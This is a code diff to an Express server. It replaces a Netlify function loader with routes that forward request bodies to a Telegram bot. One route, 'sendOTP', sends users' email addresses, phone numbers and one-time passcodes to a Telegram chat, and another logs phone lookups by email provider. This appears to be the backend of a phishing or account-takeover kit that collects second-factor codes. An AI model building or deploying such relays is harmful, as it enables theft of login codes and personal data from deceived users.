@@ -1,6 +1,5 @@
 import express from 'express';
 import { fileURLToPath } from 'url';
-import { existsSync } from 'fs';
 import path from 'path';
 
 const __filename = fileURLToPath(import.meta.url);
@@ -200,44 +199,101 @@ app.use((req, res, next) => {
 // Serve static files from dist/
 app.use(express.static(path.join(__dirname, 'dist')));
 
-// Netlify function adapter — maps /.netlify/functions/:name to netlify/functions/:name.js
-app.all('/.netlify/functions/:name', async (req, res) => {
-  const funcName = req.params.name;
+// --- API Route Handlers ---
+// These replace the deleted Netlify serverless functions.
+// They use the TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables.
 
-  // Only allow alphanumeric characters and hyphens to prevent path traversal
-  if (!/^[a-zA-Z0-9_-]+$/.test(funcName)) {
-    return res.status(400).json({ error: 'Invalid function name' });
+// POST /.netlify/functions/sendTelegram
+// Sends a message to the configured Telegram chat.
+app.post('/.netlify/functions/sendTelegram', async (req, res) => {
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+
+  if (!botToken || !chatId) {
+    console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID environment variables');
+    return res.status(500).json({ error: 'Server configuration error: Telegram credentials not set' });
   }
 
   try {
-    const funcPath = path.join(__dirname, 'netlify', 'functions', `${funcName}.js`);
+    const payload = req.body;
+    const text = typeof payload === 'string' ? payload : JSON.stringify(payload, null, 2);
+    
+    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: text.substring(0, 4096), // Telegram message limit
+        parse_mode: 'HTML',
+      }),
+    });
 
-    if (!existsSync(funcPath)) {
-      return res.status(404).json({ error: 'Function not found' });
+    const result = await telegramResponse.json();
+    
+    if (!telegramResponse.ok) {
+      console.error('Telegram API error:', result);
+      return res.status(500).json({ error: 'Failed to send Telegram message', details: result });
     }
 
-    const funcModule = await import(funcPath);
-    const handler = funcModule.handler || funcModule.default;
-
-    const event = {
-      httpMethod: req.method,
-      headers: req.headers,
-      body: req.method === 'GET' ? null : JSON.stringify(req.body),
-      queryStringParameters: req.query,
-      path: req.path,
-    };
-
-    const result = await handler(event, {});
-
-    if (result.headers) {
-      for (const [key, value] of Object.entries(result.headers)) {
-        res.setHeader(key, String(value));
-      }
-    }
-
-    res.status(result.statusCode).send(result.body);
+    res.json({ success: true, message_id: result.result?.message_id });
   } catch (error) {
-    console.error(`Error executing function ${funcName}:`, error);
+    console.error('Error sending to Telegram:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// POST /.netlify/functions/sendOTP
+// Forwards OTP request data to Telegram (OTP is handled via admin panel).
+app.post('/.netlify/functions/sendOTP', async (req, res) => {
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+
+  if (!botToken || !chatId) {
+    return res.status(500).json({ error: 'Server configuration error' });
+  }
+
+  try {
+    const { email, phone, otp } = req.body;
+    const text = `📱 OTP Request\nEmail: ${email || 'N/A'}\nPhone: ${phone || 'N/A'}\nOTP: ${otp || 'N/A'}\nTime: ${new Date().toISOString()}`;
+
+    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text,
+      }),
+    });
+
+    const result = await telegramResponse.json();
+    if (!telegramResponse.ok) {
+      return res.status(500).json({ error: 'Failed to send OTP notification' });
+    }
+
+    res.json({ success: true });
+  } catch (error) {
+    console.error('Error in sendOTP:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// POST /.netlify/functions/getProviderPhone
+// Phone detection endpoint — returns null since real provider API integration
+// requires OAuth tokens that are not available in this context.
+app.post('/.netlify/functions/getProviderPhone', async (req, res) => {
+  try {
+    const { provider, email } = req.body;
+    console.log(`Phone detection request for ${provider}: ${email}`);
+    
+    // Without OAuth tokens for each provider, we cannot fetch real phone numbers.
+    // Return a structured response indicating manual entry is required.
+    res.json({ 
+      phone: null, 
+      source: provider || 'unknown',
+      error: 'Phone detection requires provider OAuth integration' 
+    });
+  } catch (error) {
+    console.error('Error in getProviderPhone:', error);
     res.status(500).json({ error: 'Internal server error' });
   }
 });
